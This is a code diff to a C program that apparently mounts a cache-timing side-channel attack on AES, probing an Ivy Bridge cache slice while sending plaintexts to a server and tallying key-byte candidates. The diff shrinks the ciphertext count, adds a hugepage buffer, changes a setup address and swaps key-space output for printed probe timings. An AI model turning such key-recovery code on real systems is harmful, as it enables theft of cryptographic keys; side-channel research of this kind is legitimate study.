@@ -11,7 +11,7 @@
 
 #define EMPIRICAL_CACHE_ACCESS_TIME 1000
 #define REPS 1
-#define CIPHERTEXTS 20000000
+#define CIPHERTEXTS 100000 //20000000
 
 unsigned long int possible_key_space(int X[16][256]);
 
@@ -28,8 +28,12 @@ int main(int argc, char* argv[])
     int count = 0;
     int X[16][256], Y[16][256];
 
+    volatile unsigned long int x = 0;
+    size_t mem_length = (size_t)MB(2);
+    volatile char *F = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
+    F[2048] = 0xAA;
 
-    if (!ivybridge_i7_3770_setup(0x93c5e4e0)) {
+    if (!ivybridge_i7_3770_setup(0x119c01000)) {      //0x119c00000
         printf("[x] Not enough memory could be allocated on required cache-slice, please try again and/or increase hugepages available memory");
         return 0;
     }
@@ -85,7 +89,8 @@ int main(int argc, char* argv[])
             if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
             if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
 
-            prob_time = ivybridge_i7_3770_probe();
+            //x += F[0];
+            prob_time = ivybridge_i7_3770_probe(); printf("%lu\n", prob_time); //return 0;
 
             //if (prob_time < 1070) 
             //    printf("prob_time\t:\t%d\n", prob_time);
@@ -110,13 +115,13 @@ int main(int argc, char* argv[])
 
         // Realtime calculation
         if (count % 10000 == 0) {
-            printf("Run %d\n\n", count / 10000);
-            possible_key_space(X);
+            //printf("Run %d\n\n", count / 10000);
+            //possible_key_space(X);
         }
         
     }
 
-    possible_key_space(X);
+    //possible_key_space(X);
 
 
 
